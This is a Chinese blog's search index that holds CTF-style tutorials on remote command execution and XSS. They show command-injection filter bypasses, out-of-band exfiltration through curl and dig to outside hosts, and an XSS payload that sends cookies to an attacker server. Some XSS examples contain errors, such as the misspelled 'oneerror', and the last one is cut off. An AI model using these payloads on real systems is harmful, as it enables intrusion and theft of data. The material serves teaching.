<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>苏州之行</title>
    <link href="/2024/12/03/%E8%8B%8F%E5%B7%9E%E8%A1%8C%E5%B0%8F%E8%A7%86%E9%A2%91/"/>
    <url>/2024/12/03/%E8%8B%8F%E5%B7%9E%E8%A1%8C%E5%B0%8F%E8%A7%86%E9%A2%91/</url>
    
    <content type="html"><![CDATA[<h1 id="苏州之行"><a href="#苏州之行" class="headerlink" title="苏州之行"></a>苏州之行</h1><p>这是一个我自己剪辑的有关于我今年十一苏州之行的短片<br><video controls width="640" height="360"><br>    <source src="/videos/苏州行.mp4" type="video/mp4"><br></video></p>]]></content>
    
    
    
    <tags>
      
      <tag>视频</tag>
      
      <tag>旅行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE+命令执行</title>
    <link href="/2024/11/27/RCE+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2024/11/27/RCE+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="什么是RCE"><a href="#什么是RCE" class="headerlink" title="什么是RCE"></a>什么是RCE</h2><blockquote><p>远程代码执行 （RCE） 是一类软件安全缺陷&#x2F;漏洞。RCE 漏洞将允许恶意行为人通过 LAN、WAN 或 Internet 在远程计算机上执行自己选择的任何代码。RCE 属于更广泛的任意代码执行 （ACE） 漏洞类别。然而，随着互联网的普及，RCE漏洞的影响迅速扩大。因此，RCEs 现在可能是 ACE 最重要的漏洞类型。</p></blockquote><p>简单来说，RCE就是在对方主机上实现对方非预期的自己的代码，从而控制后台系统。</p><h2 id="哪些函数可以被利用呢？"><a href="#哪些函数可以被利用呢？" class="headerlink" title="哪些函数可以被利用呢？"></a>哪些函数可以被利用呢？</h2><p>那当然是可以<strong>执行命令或代码</strong>的函数辣！</p><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p>system()函数会调⽤<code>fork()</code>产⽣⼦进程，由⼦进程调⽤ <code>/bin/sh -c command</code> 执⾏特定的命令，暂停当前进程直到 command命令执⾏完毕，当此命令执⾏完后随即返回原调用的进程。</p><p> 当system()正常执⾏，将返回命令的退出码； </p><p>当返回值为127，相当于执⾏了exit函数，⽽⾃身命令没有执行； </p><p>当返回值为-1，代表没有执⾏system调⽤。</p><p>所以这个函数就是字面意思——<strong>执行参数中的命令</strong></p><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>与<code>system()</code>的不同主要在于<code>exec()</code>并不会调⽤<code>fork()</code>产⽣新进程、暂停原命令来执⾏新命令，⽽是直接覆盖原命令，对返回值有影响。 </p><p>exec执⾏command命令时，不会输出全部结果，⽽是返回结果的最后⼀⾏。</p><p>如果结果有多行需要传入第二个参数接受，必须为数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-variable">$arr</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>在shell下执⾏，适⽤于Linux Macos，并且结果可以有多⾏，字符串⽅式返回，绕过执⾏过程中出错或⽆输出，返回 NULL</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><p>passthru直接将结果输出，<strong>不返回结果</strong>(与system的区别)</p><h2 id="系统命令拼接方式"><a href="#系统命令拼接方式" class="headerlink" title="系统命令拼接方式"></a>系统命令拼接方式</h2><p>如果你可以控制上述函数，那么想达到特定目的时，一条命令显然是不够的，我们需要将多条命令拼接在一起执行。</p><ul><li><p><code>|</code>：管道符，管道符前的命令输出作为管道符后面的标准输入（非常形象的名字）。</p><blockquote><p>例如：<code>help|more</code></p></blockquote></li><li><p><code>&amp;</code>：commandA &amp; commandB 先运行命令A，然后运行命令B</p></li><li><p><code>||</code>：commandA || commandB 运行命令A，如果失败则运行命令B</p></li><li><p><code>&amp;&amp;</code>： commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</p></li><li><p>cmd1 ; cmd2 (; 分号操作符)执行多条命令</p></li></ul><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>如果你是程序的编写者，显然你会想方法阻止用户任意使用你的命令执行函数，具体的表现为限制用户的输入内容，对用户的输入内容进行检测和过滤。兵来将挡，水来土掩。同样的，我们也有许多绕过限制的方法，请看：</p><h3 id="php字符被过滤"><a href="#php字符被过滤" class="headerlink" title="php字符被过滤"></a>php字符被过滤</h3><p>我们知道，正常的php代码是需要有php标记（标签）的，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果<code>php</code>三个字母被过滤，我们可以使用短标签，效果相同：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-comment">//php代码 ?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="system被过滤"><a href="#system被过滤" class="headerlink" title="system被过滤"></a>system被过滤</h3><p>过滤了system关键字，该如何执行命令呢？</p><p>使用反引号绕过：</p><p>等等，先介绍一下反引号：</p><blockquote><p>大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的反引号作<strong>指令替代</strong>，意思是以某一个指令的输出结果<strong>作为另一个指令的输入项</strong>。linux下反引号里面包含的就是需要执行的系统命令，<strong>而反引号里面的系统命令会先执行，成功执行后将结果传递给调用它的命令(就是将反引号内命令的输出作为输入执行)，类似于|管道</strong>，这个就是内联执行。</p></blockquote><p><strong>反引号可以用来在PHP代码中直接执行系统命令，但是想要回显的话还是需要一个 <code>echo</code>，当然不止echo，其他外带信息输出信息的方式也可以，这里有个叫法叫内联执行</strong>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-keyword">echo</span> `ls /`; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><ul><li><p>利用URL编码绕过：%20、%09(Tab)</p></li><li><p>还有利⽤ $IFS$9、 $IFS$1 、 ${IFS}、 $IFS等内部域分隔符（也是IFS的⼀种，因此没有双引号包裹时被echo会 被空格替换）</p><blockquote><p>IFS（Internal Filed Separator，内部域分隔符）是一个set变量（shell变量），默认是空格、Tab键、换行符，使用for循环读取值列表时，会根据IFS的值判断列表中值的个数。</p><p>IFS的作⽤就是把字符串⾥的某某字符（和它⼀样的字符）转义成分隔符。</p><p>也就是说可以对IFS重新赋值</p><p>而空格被当作分隔符时会合并，因此直接echo含多个空格的变量，会去重连续的空格，若要保留，echo时加上双引号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;IFS=<span class="hljs-string">&#x27;&amp;&#x27;</span><br>&gt;STRING2=<span class="hljs-string">&quot;111&amp;222&amp;&amp;333&amp;&amp;&amp;444&quot;</span><br>&gt;<span class="hljs-built_in">echo</span> <span class="hljs-variable">$STRING2</span> <span class="hljs-comment"># 111 222 333 444 (没有双引号包裹，分隔符以空格显示)</span><br>&gt;<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$STRING2</span>&quot;</span> <span class="hljs-comment"># 111&amp;222&amp;&amp;333&amp;&amp;&amp;444</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>花括号{}，比如{cat,flag}</p><blockquote><p>注意：如果执行的命令不带参数也要含有<code>,</code>，如<code>&#123;ls,&#125;</code>。</p></blockquote></li><li><p><code>&lt;</code>、<code>&lt;&gt;</code></p><h2 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h2><h3 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IC9mbGFn&quot;</span>|<span class="hljs-built_in">base64</span> -d|bash //cat /flag<br></code></pre></td></tr></table></figure><h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">ph<span class="hljs-string">&quot;&quot;</span>p ---&gt; php<br>ca<span class="hljs-string">&#x27;&#x27;</span>t ---&gt; cat<br>ca``t ---&gt; cat<br></code></pre></td></tr></table></figure><h3 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=127.0.0.1;a=l;b=s;$a<span class="hljs-variable">$b</span><br></code></pre></td></tr></table></figure><h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ca\t =&gt; cat<br>fl\ag =&gt; flag<br></code></pre></td></tr></table></figure><h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p>什么是Linux shell的通配符&#x2F;glob模式：</p><blockquote><p>glob 模式（globbing）也被称之为 shell 通配符，名字的起源来自于 Unix V6 中的&#x2F;etc&#x2F;glob （详见 man 文档）。glob 是一种特殊的模式匹配，最常见的是通配符拓展，也可以将 glob 模式设为<strong>精简了的正则表达式</strong>，在最新的 CentOS 7 中已经删除了 glob 的相关描述文档，删除的原因由于 glob 已经整合到了 shell 之中，然后就有了 shell 通配符。shell 通配符 &#x2F; glob 模式通常用来<strong>匹配目录以及文件，而不是文本</strong></p></blockquote></li></ul><p>语法：</p><table><thead><tr><th>字符</th><th align="center">解释</th></tr></thead><tbody><tr><td>*</td><td align="center">匹配任意长度任意字符</td></tr><tr><td>?</td><td align="center">匹配任意单个字符</td></tr><tr><td>[list]</td><td align="center">匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td></tr><tr><td>[^list]</td><td align="center">匹配指定范围外的任意单个字符或字符集合</td></tr><tr><td>[!list]</td><td align="center">同<code>[^list]</code></td></tr><tr><td>{str1,str2,…}</td><td align="center">匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td></tr></tbody></table><p>所以我们的命令就可以这么写：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#flag在/flag中</span><br><span class="hljs-built_in">cat</span>%09/fla*<br><span class="hljs-built_in">cat</span>%09/fla?<br><span class="hljs-comment">#在/flag.txt中</span><br><span class="hljs-built_in">cat</span>%09/fla*<br><span class="hljs-built_in">cat</span>%09/fla?????<br><span class="hljs-comment">#有什么不同？</span><br><br>/bin/ca? a*Hello!<br></code></pre></td></tr></table></figure><blockquote><p>对于最后一条，在命令补全的时候指定了命令路径，这是因为补全时会存在歧义，拿<code>ca?</code>举例，可以补全为<code>cal</code>或<code>cat</code>，这两个命令路径可能不同。</p></blockquote><h3 id="HEX编码"><a href="#HEX编码" class="headerlink" title="HEX编码"></a>HEX编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;636174202f666c6167&quot;</span>|xxd -r -p|bash        执⾏<span class="hljs-built_in">cat</span> /flag<br>$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>) 执⾏<span class="hljs-built_in">cat</span> /flag<br>&#123;<span class="hljs-built_in">printf</span>,<span class="hljs-string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|<span class="hljs-variable">$0</span> 执⾏<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><h3 id="Oct（八进制）编码"><a href="#Oct（八进制）编码" class="headerlink" title="Oct（八进制）编码"></a>Oct（八进制）编码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">$(printf <span class="hljs-string">&quot;\154\163&quot;</span>)   执⾏ls<br></code></pre></td></tr></table></figure><h3 id="内联执行绕过"><a href="#内联执行绕过" class="headerlink" title="内联执行绕过"></a>内联执行绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;a`pwd`&quot;</span> <span class="hljs-comment">#输出a/root</span><br>?ip=127.0.0.1;<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$9</span>`<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://niko-1319318245.cos.ap-nanjing.myqcloud.com/Markdown/image-20231018200013010.png" alt="image-20231018200013010"></p></blockquote><h3 id="匹配绕过"><a href="#匹配绕过" class="headerlink" title="[ ]匹配绕过"></a>[ ]匹配绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">c[a]t =&gt; <span class="hljs-built_in">cat</span><br>mo[r]e =&gt; more<br><span class="hljs-keyword">in</span>[d]ex =&gt; index<br>p[h]p =&gt; php<br></code></pre></td></tr></table></figure><h3 id="利用环境变量取值"><a href="#利用环境变量取值" class="headerlink" title="利用环境变量取值"></a>利用环境变量取值</h3><blockquote><p>题外话：相信大家配置环境的时候肯定设置过环境变量这个东西，但你真的知道它是个啥嘛？</p></blockquote><blockquote><p>首先要明白一个概念，就是我们的OS（<strong>Operate System</strong>）中文译为操作系统，本质上就是一个巨大的软件。</p><p>电脑上运行的操作系统其实就是一个巨大的程序，这个程序可能就是 Windows，Linux，Mac 系统中的一种，但是本质都是程序，在这个程序里面有个环境变量。这个变量由其他应用一起使用。本质上来说，环境变量就类似于编程中的变量。</p><p><a href="https://chihokyo.com/post/6/">进一步了解</a></p></blockquote><p><img src="https://niko-1319318245.cos.ap-nanjing.myqcloud.com/Markdown/image-20231030195622647.png" alt="image-20231030195622647"></p><blockquote><p><code>: 23: 1</code>:从下标为23的字符起打印一个字符</p><p>注意：使用<strong>kali</strong>复现时要注意：从2020.4版本开始，kali的默认shell是ZSH,图中变量为bash下的变量，需要自己手动切换。</p></blockquote><h3 id="使用空变量"><a href="#使用空变量" class="headerlink" title="使用空变量"></a>使用空变量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c<span class="hljs-variable">$&#123;z&#125;</span>at a.txt<br></code></pre></td></tr></table></figure><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>外带信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl vps:port/`<span class="hljs-built_in">whoami</span>`#使目标主机访问vps:port执行命令<span class="hljs-built_in">whoami</span>，再访问vps看日志即可<br></code></pre></td></tr></table></figure><p>加上编码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl 34kk35.ceye.io/$(<span class="hljs-built_in">whoami</span> | <span class="hljs-built_in">base64</span>)<br></code></pre></td></tr></table></figure><p>使用DNS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig `<span class="hljs-built_in">whoami</span>`.34kk35.ceye.io<br></code></pre></td></tr></table></figure><blockquote><p>自行了解DNSlog和ceye的作用</p></blockquote><h2 id="课后阅读"><a href="#课后阅读" class="headerlink" title="课后阅读"></a>课后阅读</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌</a></p><blockquote><p>补充：获取数字1 0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(!<span class="hljs-string">&#x27;&#x27;</span>);<span class="hljs-comment">//bool(true)</span><br><span class="hljs-title function_ invoke__">var_dump</span>(!!<span class="hljs-string">&#x27;&#x27;</span>);<span class="hljs-comment">//bool(false)</span><br><span class="hljs-title function_ invoke__">var_dump</span>(!<span class="hljs-string">&#x27;&#x27;</span>+!!<span class="hljs-string">&#x27;&#x27;</span>);<span class="hljs-comment">//int(1)</span><br><span class="hljs-comment">//直接放下标也⾏</span><br><span class="hljs-variable">$____</span>=<span class="hljs-variable">$_</span>[!<span class="hljs-string">&#x27;&#x27;</span>];<span class="hljs-comment">//赋值$_[1]</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>[!!<span class="hljs-string">&#x27;&#x27;</span>];<span class="hljs-comment">//赋值$_[0]</span><br></code></pre></td></tr></table></figure></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>技术帖</tag>
      
      <tag>NIKO</tag>
      
      <tag>RCE</tag>
      
      <tag>网络安全，命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS（跨站脚本攻击）</title>
    <link href="/2024/11/27/XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89/"/>
    <url>/2024/11/27/XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS（跨站脚本攻击）"><a href="#XSS（跨站脚本攻击）" class="headerlink" title="XSS（跨站脚本攻击）"></a>XSS（跨站脚本攻击）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>XSS（Cross-Site Scripting）跨站脚本攻击是一种常见的网络安全漏洞，它允许攻击者将恶意脚本注入到网页中，然后在用户的浏览器中执行这些恶意脚本。这种攻击利用了网页应用程序对用户输入的不当处理，攻击者通过在网页中注入恶意脚本，使其在用户浏览该网页时执行，从而实施攻击。</p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>实际上就是网页缺乏对用户输入的过滤与验证，使得攻击者可以将恶意脚本传送至数据库或者是目标用户的前端。当用户访问恶意界面时就会执行已注入的脚本。</p><p>一般使用弹窗进行测试，如果可以弹窗，那你想干什么都行（误）</p><p>假设我们想要获取cookie：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>().<span class="hljs-property">src</span> = <span class="hljs-string">&quot;http://myserver.site?cookie=&quot;</span>+<span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>攻击者将恶意脚本存储在目标网站的数据库中，当其他用户浏览包含该恶意脚本的页面时，恶意脚本会从服务器上获取并在用户浏览器中执行。</p><blockquote><p>特点：持久化，代码上传至服务器，如个人博客，文章，评论等等，只要用户访问该页面就会触发脚本，攻击范围广，威胁极大，容易造成蠕虫，盗窃cookie。</p><p>一般在做CTF题目中的具体思路就是利用GET、POST或者抓包在Referer，Cookie的地方植入我们的恶意脚本</p></blockquote><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>攻击者构造一个包含恶意脚本的URL，并将该URL发送给目标用户。当用户点击包含恶意脚本的URL时，恶意脚本会被注入到目标网页中并在用户浏览器中执行。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM（Document Object Model）型XSS攻击是一种利用网页的DOM结构来进行攻击的方式。攻击者构造一个恶意URL，并通过欺骗用户点击该URL或者通过其他方式使其被浏览器加载。当网页加载完成并解析时，恶意脚本会修改页面的DOM结构，从而实现攻击的目的。</p><h3 id="JSONP-XSS"><a href="#JSONP-XSS" class="headerlink" title="JSONP XSS"></a>JSONP XSS</h3><p>JSONP是一种跨域数据传输技术，它通过动态创建script标签来获取跨域的JSON数据。然而，由于JSONP的实现机制，它存在安全风险，可能被攻击者用于进行XSS攻击。它利用JSONP协议实现，一般浏览器都会设置CSP同源策略限制，不允许直接调用其他域名的API，这就出现了JSONP协议，JSONP协议通过利用浏览器对<code>&lt;script&gt;</code>标签的允许跨域加载特性，允许从一个域名中获取到另一个域名的数据。所以说我们作为攻击者可以在JSONP请求中注入恶意代码实现XSS攻击。</p><blockquote><p>这是一个不太常见的XSS的攻击方式，所以我们稍加举例以作说明。</p><ol><li>攻击者找到一个目标网站，该网站实现了JSONP接口，并在响应中返回可执行的JavaScript代码。</li><li>攻击者构造一个恶意URL，将其中的回调函数名称设置为自定义的恶意脚本。例如：<code>http://target-website.com/jsonp?callback=maliciousFunction</code>.</li><li>攻击者诱使受害者点击包含恶意URL的链接或访问恶意URL。</li><li>目标网站接收到请求后，会将恶意脚本作为响应的一部分返回给浏览器。</li><li>浏览器解析响应，并执行恶意脚本。由于恶意脚本在目标网站的域下执行，它可以访问该域的敏感数据、执行操作或者修改页面。</li></ol></blockquote><h2 id="插入位置"><a href="#插入位置" class="headerlink" title="插入位置"></a>插入位置</h2><h3 id="1-插入到HTML注释内容中"><a href="#1-插入到HTML注释内容中" class="headerlink" title="1.插入到HTML注释内容中"></a>1.插入到HTML注释内容中</h3><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- </span><br><span class="hljs-comment">&lt;script&gt;</span><br><span class="hljs-comment">  alert(&#x27;XSS攻击成功！&#x27;);</span><br><span class="hljs-comment">&lt;/script&gt;</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-插入到HTML标签的属性值中"><a href="#2-插入到HTML标签的属性值中" class="headerlink" title="2.插入到HTML标签的属性值中"></a>2.插入到HTML标签的属性值中</h3><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;NIKO&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.png&quot;</span><span class="hljs-attr">oneerror</span>=<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;NIKO&#x27;)&lt;/script&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>第一行代码是一个恶意的JavaScript脚本。它使用<code>alert()</code>函数来弹出一个对话框，显示文本”NIKO”。攻击者可以将任意的恶意代码放在这个脚本中，以执行各种恶意操作。</p><p>第二个代码是一个HTML的<code>&lt;img&gt;</code>标签，用于在页面上显示一张图像。然而，通过在<code>oneerror</code>属性中注入恶意的JavaScript脚本，攻击者可以利用该标签触发XSS攻击。在这个示例中，当图像加载失败时，<code>oneerror</code>属性中的恶意脚本会被执行，弹出一个对话框，显示文本”NIKO”。</p><p>这种方式利用了图像元素的<code>onerror</code>事件，攻击者通过注入恶意脚本来改变事件处理程序，从而执行任意的JavaScript代码。</p><blockquote><p><code>onerror</code> 是一个HTML属性，通常用于处理在加载资源（如图像、脚本、样式表等）时发生错误的情况。它是一个事件处理程序，当资源无法加载时，浏览器会触发 <code>onerror</code> 事件，并执行相应的 JavaScript 代码。</p><p>在上述代码中，<code>onerror</code> 属性被应用于 <code>&lt;img&gt;</code> 标签。这个属性指定了一个 JavaScript 代码片段，当图像加载失败时会被执行。恶意攻击者可以利用这个特性，将恶意脚本注入 <code>onerror</code> 属性中，从而触发 XSS 攻击。</p><p>在示例中，<code>onerror</code> 属性被设置为 <code>&lt;script&gt;alert(&#39;NIKO&#39;)&lt;/script&gt;</code>，也就是一个弹出对话框的 JavaScript 代码。当图像加载失败时，浏览器会执行这个恶意脚本，弹出一个对话框显示文本 “NIKO”。</p><p>由于 <code>onerror</code> 属性可以包含任意的 JavaScript 代码，攻击者可以在其中插入各种恶意操作，如窃取用户信息、篡改页面内容、重定向到恶意网站等。</p></blockquote><h3 id="3-插入到HTML标签的属性名中"><a href="#3-插入到HTML标签的属性名中" class="headerlink" title="3.插入到HTML标签的属性名中"></a>3.插入到HTML标签的属性名中</h3><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;NIKO&#x27;)&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS攻击成功！&#x27;)&lt;/script&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>该代码包含一个 <code>&lt;input&gt;</code> 元素，其中包含三个属性：<code>type</code>、<code>onclick</code> 和 <code>name</code>。</p><ul><li><code>type=&quot;text&quot;</code>：指定输入框的类型为文本。</li><li><code>onclick=&quot;alert(&#39;NIKO&#39;)&quot;</code>: 当用户点击这个输入框时，将弹出一个对话框显示文本 “NIKO”。这是一个正常的JavaScript事件处理函数。</li><li><code>name=&quot;&gt;&lt;script&gt;alert(&#39;XSS攻击成功！&#39;)&lt;/script&gt;&quot;</code>: 这个属性是 <code>name</code> 属性，其值以恶意脚本的形式结束。该恶意脚本将在目标网页中执行，弹出一个对话框显示文本 “XSS攻击成功！”。</li></ul><p>这段代码的XSS攻击原理如下：</p><ol><li>一个文本输入框被创建，并指定了 <code>onclick</code> 事件处理函数。当用户点击输入框时，弹出一个对话框显示 “NIKO”。这个部分是正常的JavaScript代码，没有直接的XSS问题。</li><li>然而，攻击者通过注入恶意代码来构造 <code>name</code> 属性的值。在这个示例中，恶意脚本 <code>alert(&#39;XSS攻击成功！&#39;)</code> 被注入到 <code>name</code> 属性中，并以闭合引号的形式结束。</li></ol><p>当表单数据被提交到后端处理时，如果后端在处理过程中没有适当地对用户输入进行验证和过滤，恶意脚本将会在目标网页上执行，从而导致XSS攻击成功。</p><h3 id="4-插入到HTML标签名中"><a href="#4-插入到HTML标签名中" class="headerlink" title="4.插入到HTML标签名中"></a>4.插入到HTML标签名中</h3><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>img 